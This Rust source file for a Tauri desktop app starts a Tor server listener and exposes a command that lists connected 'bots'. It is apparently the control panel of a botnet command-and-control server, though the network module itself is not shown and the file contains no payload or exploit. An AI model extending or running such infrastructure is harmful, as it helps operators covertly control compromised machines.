// Learn more about Tauri commands at https://tauri.app/develop/calling-rust/
use std::{ collections::HashMap, sync::Arc };
use network::tor::{ BotMap, TorServerHandler };
use lazy_static::lazy_static;
use tokio::sync::RwLock;
mod network;

lazy_static! {
    pub static ref TOR_SERVER_HANDLER: Arc<RwLock<Option<TorServerHandler>>> = Arc::new(
        RwLock::new(None)
    );
}

#[tauri::command(async)]
async fn get_all_bots() -> Result<BotMap, String> {
    let server_ref = TOR_SERVER_HANDLER.read().await;
    if let Some(tor_server) = server_ref.as_ref() {
        let bot_map = tor_server.bot_map.read().await;

        return Ok(bot_map.clone());
    } else {
        return Err("TOR_SERVER_HANDLER is None".to_owned());
    }
}

#[tauri::command]
fn greet(name: &str) -> String {
    format!("Hello, {}! You've been greeted from Rust!", name)
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    let tokio_runtime = tokio::runtime::Builder::new_multi_thread().enable_all().build().unwrap();
    tokio_runtime.spawn(async move {
        if let Ok(mut tor_server) = TorServerHandler::new().await {
            let mut server_ref = TOR_SERVER_HANDLER.write().await;
            *server_ref = Some(tor_server.clone());
            drop(server_ref);

            if let Err(e) = tor_server.listen_for_connections().await {
                eprintln!("Server errored out: {}", e);
            }
        }
    });
    tauri::Builder
        ::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![greet, get_all_bots])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
